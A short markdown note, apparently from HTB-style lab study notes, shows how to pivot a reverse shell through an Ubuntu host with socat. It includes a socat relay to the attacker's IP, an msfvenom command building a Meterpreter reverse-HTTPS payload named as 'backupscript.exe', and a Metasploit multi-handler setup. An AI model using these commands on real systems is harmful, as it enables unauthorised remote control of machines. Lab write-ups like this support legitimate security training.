---
title: Socat Reverse Shell
draft: false
tags:
  - socat
---
What is **socat**?

It allows to create pipe sockets between two independent network channels without needing SSH tunneling. 

## Socat Reverse Shell

Let's try spawning a reverse shell from Windows Machine which is two hops away from attakcker machine. Attacker -> Ubuntu -> Windows

Let's start socat listener on Ubuntu machine(PivotHost):

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat will listen locally on port 8080 and forward all the traffic to port 80 on attacker machine (10.10.14.18).

After creating reverse shell with msfvenom, we will transfer it to Windows target:

```shell-session
jadu101@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Now, start msfconsole and spin up multi-handler:

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

Multi-handler is set up to listen on port 80.

Once we run the exploit on Windows target, we will get a reverse shell.

